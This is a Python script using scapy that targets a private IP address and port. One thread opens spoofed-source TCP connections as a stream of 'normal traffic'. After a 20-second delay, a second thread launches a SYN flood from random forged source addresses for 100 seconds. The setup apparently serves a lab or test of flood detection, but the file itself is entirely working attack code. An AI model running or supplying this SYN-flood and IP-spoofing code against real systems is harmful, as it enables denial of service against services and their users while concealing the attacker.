import threading
import time
from scapy.all import IP, TCP, send, RandIP, RandShort, sr1

def send_normal_traffic(target_ip, target_port, duration=140):
    start_time = time.time()
    connection_count = 0
    while time.time() - start_time < duration:
        src_ip = str(RandIP())
        src_port = int(RandShort())
        
        ip_layer = IP(dst=target_ip, src=src_ip)
        seq = 1000

        syn_pkt = ip_layer / TCP(sport=src_port, dport=target_port, flags="S", seq=seq)
        syn_ack = sr1(syn_pkt, timeout=2, verbose=0)

        if syn_ack is None or not syn_ack.haslayer(TCP):
            continue

        seq += 1
        ack_num = syn_ack[TCP].seq + 1
        ack_pkt = ip_layer / TCP(sport=src_port, dport=target_port, flags="A", seq=seq, ack=ack_num)
        send(ack_pkt, verbose=0)
 
        data = "Hello"
        data_pkt = ip_layer / TCP(sport=src_port, dport=target_port, flags="PA", seq=seq, ack=ack_num) / data
        send(data_pkt, verbose=0)
        seq += len(data)
 
        fin_pkt = ip_layer / TCP(sport=src_port, dport=target_port, flags="FA", seq=seq, ack=ack_num)
        fin_ack = sr1(fin_pkt, timeout=2, verbose=0)
        if fin_ack is not None and fin_ack.haslayer(TCP):
            final_ack = ip_layer / TCP(
                sport=src_port,
                dport=target_port,
                flags="A",
                seq=seq + 1,
                ack=fin_ack[TCP].seq + 1
            )
            send(final_ack, verbose=0)
 
        connection_count += 1
        time.sleep(0.05)
    
    print(f"[Normal Traffic] Establised {connection_count} connections in {duration} seconds.")

def syn_flood(target_ip, target_port, duration=100):
    time.sleep(20)
    start_time = time.time()
    packet_count = 0
    while time.time() - start_time < duration:
        ip_layer = IP(dst=target_ip, src=RandIP())
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags='S', seq=1000)
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)
        packet_count += 1
        time.sleep(0.01)
    print(f"[SYN Flood] Sent {packet_count} SYN packets in {duration} seconds.")

if __name__ == '__main__':
    target_ip = "172.21.124.53"
    target_port = 12345

    normal_thread = threading.Thread(target=send_normal_traffic, args=(target_ip, target_port))
    syn_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    
    normal_thread.start()
    syn_thread.start()
    
    normal_thread.join()
    syn_thread.join()
